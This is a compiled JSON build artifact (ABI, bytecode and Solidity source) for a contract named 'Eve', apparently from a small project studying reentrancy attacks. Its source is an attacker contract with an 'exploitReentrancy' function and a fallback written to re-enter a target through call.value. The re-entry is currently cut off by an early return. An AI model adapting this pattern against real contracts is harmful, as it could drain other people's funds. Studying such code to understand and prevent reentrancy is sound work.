{
  "contractName": "Eve",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "alreadyCalled",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "tokenAmount",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "a",
          "type": "address"
        },
        {
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "exploitReentrancy",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x606060405261016a806100136000396000f300606060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806339560df414610059578063b516e4d71461009b578063eec7faa1146100c8575b005b341561006457600080fd5b610099600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919080359060200190919050506100f1565b005b34156100a657600080fd5b6100ae610126565b604051808215151515815260200191505060405180910390f35b34156100d357600080fd5b6100db610138565b6040518082815260200191505060405180910390f35b8173ffffffffffffffffffffffffffffffffffffffff168160405160006040518083038185876187965a03f192505050505050565b6000809054906101000a900460ff1681565b600154815600a165627a7a72305820fbbc74ad6d978b83a1997c03506d5724dc96e3fe477e811a160cb93eeeb0ce5b0029",
  "source": "pragma solidity ^0.4.19;\n\ncontract Eve {\n\n  \n       bool public alreadyCalled;\n       uint public tokenAmount;\n   \n        function Eve() public payable {}\n\n   \n    \n    function exploitReentrancy(address a, uint amount) public {\n       //a.call(bytes4(sha3(\"buyTokens(address _beneficiary)\")), this.address, {value: 50});\n       // tokenAmount = amount;\n        a.call.value(amount)();\n        //a.send(amount);\n       //a.transfer(amount);\n        \n    }\n\n   /* function() withdraw public onlyOwner () {\n        token.transfer(msg.sender, token.balances[this.address]);\n    }*/\n\n\n    \n    function() payable public {\n       return;\n        if(alreadyCalled == true) {\n            return;\n       }\n       // msg.sender.call(bytes4(sha3(\"buyTokens(address _beneficiary)\")), this.owner);\n        msg.sender.call.value(tokenAmount)();\n        alreadyCalled = true;\n        \n        \n    }\n    \n    /*\n    function() public payable {\n\n    }\n    */\n    \n    \n}\n",
  "sourcePath": "/Users/leovonkleist/Desktop/SmartContracts/reentrancy/contracts/Eve.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.19+commit.c4cbbb05.Emscripten.clang"
  },
  "schemaVersion": "2.0.0",
  "updatedAt": "2018-04-18T12:59:45.124Z"
}